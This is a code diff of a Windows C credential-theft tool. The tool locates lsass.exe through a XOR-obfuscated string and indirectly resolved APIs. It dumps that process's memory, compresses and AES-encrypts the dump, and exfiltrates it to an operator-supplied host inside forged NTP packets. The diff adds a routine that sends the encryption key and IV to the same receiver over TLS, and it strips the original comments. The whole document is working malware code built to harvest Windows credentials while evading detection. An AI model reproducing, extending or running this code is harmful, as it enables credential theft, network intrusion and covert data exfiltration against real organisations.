@@ -1,3 +1,4 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <tlhelp32.h>
 #include <dbghelp.h>
@@ -5,7 +6,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <zlib.h>
-#include <winsock2.h>
 #include <ws2tcpip.h>
 #include <openssl/aes.h>
 #include <openssl/rand.h>
@@ -21,8 +21,56 @@
 #define AES_TAG_SIZE 16
 #define COMPRESSED_BUFFER_SIZE 1024
 
-// --- Fonction de déobfuscation ---
-// Décodage d'une chaîne obfusquée (chaque caractère XOR avec la clé)
+int send_key_securely(const char *target_ip, int target_tls_port, const unsigned char *key, const unsigned char *iv) {
+    SSL_library_init();
+    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+    if (!ctx) {
+        fprintf(stderr, "[!] Error initializing SSL_CTX.\n");
+        return -1;
+    }
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        fprintf(stderr, "[!] Error creating TLS socket.\n");
+        SSL_CTX_free(ctx);
+        return -1;
+    }
+
+    struct sockaddr_in server_addr;
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(target_tls_port);
+    server_addr.sin_addr.s_addr = inet_addr(target_ip);
+
+    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        fprintf(stderr, "[!] TLS connection failed.\n");
+        closesocket(sock);
+        SSL_CTX_free(ctx);
+        return -1;
+    }
+
+    SSL *ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sock);
+    if (SSL_connect(ssl) <= 0) {
+        fprintf(stderr, "[!] SSL connection error.\n");
+        SSL_free(ssl);
+        closesocket(sock);
+        SSL_CTX_free(ctx);
+        return -1;
+    }
+
+    // Send the key and IV
+    SSL_write(ssl, key, AES_KEY_SIZE);
+    SSL_write(ssl, iv, AES_IV_SIZE);
+
+    fprintf(stderr, "[+] AES key and IV sent via TLS.\n");
+
+    SSL_free(ssl);
+    closesocket(sock);
+    SSL_CTX_free(ctx);
+    return 0;
+}
+
 void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
     size_t i = 0;
     while (encoded[i] != L'\0' && i < maxLen - 1) {
@@ -32,8 +80,6 @@ void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxL
     decoded[i] = L'\0';
 }
 
-// --- Fonction pour récupérer le PID d'un processus ---
-// Utilise les fonctions indirectes : CreateToolhelp32Snapshot, Process32FirstW, Process32NextW et CloseHandle
 DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     DWORD pid = 0;
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
@@ -71,11 +117,7 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     return pid;
 }
 
-// --- Fonction de dump mémoire ---
-// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump (appel indirect déjà présent)
-// et un mapping mémoire temporaire en passant par les appels indirects de kernel32.dll
 BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
-    // Chargement de DbgHelp.dll et récupération de MiniDumpWriteDump
     HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
     if (!hDbgHelp)
         return FALSE;
@@ -88,7 +130,6 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
         return FALSE;
     }
 
-    // Chargement des fonctions kernel32.dll en mode indirect
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
     if (!hKernel32) {
         FreeLibrary(hDbgHelp);
@@ -141,12 +182,8 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
             FreeLibrary(hDbgHelp);
             return FALSE;
         }
-        if (*dumpBuffer) {
-            memcpy(*dumpBuffer, buffer, bufferSize);
-            *dumpSize = bufferSize;
-        } else {
-            success = FALSE;
-        }
+        memcpy(*dumpBuffer, buffer, bufferSize);
+        *dumpSize = bufferSize;
     }
     fUnmapViewOfFile(buffer);
     fCloseHandle(hMapping);
@@ -155,8 +192,6 @@ BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     return success;
 }
 
-// --- Fonction de compression ---
-// Compresse le buffer à l'aide de zlib (ici, l'appel reste direct car zlib n'est pas une API Windows)
 int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
     uLong bound = compressBound(inputSize);
     *compressedBuffer = (char*)malloc(bound);
@@ -171,15 +206,12 @@ int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedB
     return res;
 }
 
-// --- Fonctions pour la création et l'envoi de faux paquets NTP ---
-// Crée un paquet NTP de 48 octets avec le payload placé à l'offset 40
 void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
     memset(packet, 0, 48);
     packet[0] = 0x1B; // LI=0, VN=3, Mode=3
-    memcpy_s(packet + 40, payload, 8);
+    memcpy(packet + 40, payload, 8);
 }
 
-// Envoie un paquet UDP contenant le faux paquet NTP en utilisant les fonctions indirectes de ws2_32.dll
 int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
     HMODULE hWs2_32 = GetModuleHandleW(L"ws2_32.dll");
     if (!hWs2_32)
@@ -224,9 +256,6 @@ int SendNTPPacket(const char *target_ip, int target_port, const unsigned char pa
     return result;
 }
 
-// --- Envoi du dump compressé sous forme de paquets NTP fragmentés ---
-// Le premier paquet est un header de 8 octets (4 octets : nombre total de paquets, 4 octets : taille totale)
-// Chaque paquet de données contient 8 octets : 4 octets de numéro de séquence et 4 octets de fragment de données.
 int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *data, size_t data_size) {
     unsigned char key[AES_KEY_SIZE], iv[AES_IV_SIZE], tag[AES_TAG_SIZE];
     unsigned char compressed_data[COMPRESSED_BUFFER_SIZE];
@@ -234,7 +263,7 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
 
     // Compress data
     if (compress(compressed_data, &compressed_size, (const unsigned char *)data, data_size) != Z_OK) {
-        printf("[!] Compression failed.\n");
+        fprintf(stderr, "[!] Compression failed.\n");
         return -1;
     }
 
@@ -266,10 +295,10 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
     header[7] = ((unsigned int)compressed_size) & 0xFF;
 
     if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
-        printf("[!] Failed to send header packet.\n");
+        fprintf(stderr, "[!] Failed to send header packet.\n");
         return -1;
     }
-    printf("[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressed_size);
+    fprintf(stderr, "[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressed_size);
 
     // Send data packets
     for (int seq = 0; seq < total_fragments; seq++) {
@@ -285,17 +314,16 @@ int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *
         if (copySize > 0)
             memcpy(payload + 4, encrypted_data + offset, copySize);
         if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
-            printf("[!] Failed to send packet %d.\n", seq + 1);
+            fprintf(stderr, "[!] Failed to send packet %d.\n", seq + 1);
             return -1;
         }
-        printf("[+] Packet %d/%d sent.\n", seq + 1, total_fragments);
+        fprintf(stderr, "[+] Packet %d/%d sent.\n", seq + 1, total_fragments);
     }
-    printf("[+] Transmission completed.\n");
+    fprintf(stderr, "[+] Transmission completed.\n");
     return 0;
 }
 
 int main(void) {
-    // Obfuscation de "lsass.exe" (chaque caractère XOR avec 0x13)
     wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
                                   's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
                                   'e' ^ 0x13, L'\0' };
@@ -307,18 +335,27 @@ int main(void) {
     int target_port;
     printf("[*] Enter receiver IP: ");
     if (scanf("%63s", target_ip) != 1) {
-        printf("[!] Failed to read IP.\n");
+        fprintf(stderr, "[!] Failed to read IP.\n");
         return 1;
     }
     printf("[*] Enter receiver port: ");
     if (scanf("%d", &target_port) != 1) {
-        printf("[!] Failed to read port.\n");
+        fprintf(stderr, "[!] Failed to read port.\n");
+        return 1;
+    }
+
+    unsigned char key[AES_KEY_SIZE], iv[AES_IV_SIZE], tag[AES_TAG_SIZE];
+    RAND_bytes(key, AES_KEY_SIZE);
+    RAND_bytes(iv, AES_IV_SIZE);
+
+    if (send_key_securely(target_ip, target_port, key, iv) < 0) {
+        fprintf(stderr, "[!] Failed to send AES key via TLS.\n");
         return 1;
     }
 
     DWORD pid = GetTargetProcessPID(targetProcessName);
     if (pid == 0) {
-        printf("[!] Process not found.\n");
+        fprintf(stderr, "[!] Process not found.\n");
         return 1;
     }
     wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);
@@ -326,27 +363,27 @@ int main(void) {
     char *dumpBuffer = NULL;
     size_t dumpSize = 0;
     if (!DumpProcessToMemory(pid, &dumpBuffer, &dumpSize)) {
-        printf("[!] Failed to dump process memory.\n");
+        fprintf(stderr, "[!] Failed to dump process memory.\n");
         return 1;
     }
-    printf("[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);
+    fprintf(stderr, "[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);
 
     char *compressedBuffer = NULL;
     size_t compressedSize = 0;
     int compRes = CompressBuffer(dumpBuffer, dumpSize, &compressedBuffer, &compressedSize);
     free(dumpBuffer);
     if (compRes != Z_OK) {
-        printf("[!] Failed to compress dump. Error: %d\n", compRes);
+        fprintf(stderr, "[!] Failed to compress dump. Error: %d\n", compRes);
         return 1;
     }
-    printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);
+    fprintf(stderr, "[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);
 
     if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
-        printf("[!] Failed to send compressed dump to receiver.\n");
+        fprintf(stderr, "[!] Failed to send compressed dump to receiver.\n");
         free(compressedBuffer);
         return 1;
     }
     free(compressedBuffer);
-    printf("[+] Done!\n");
+    fprintf(stderr, "[+] Done!\n");
     return 0;
 }
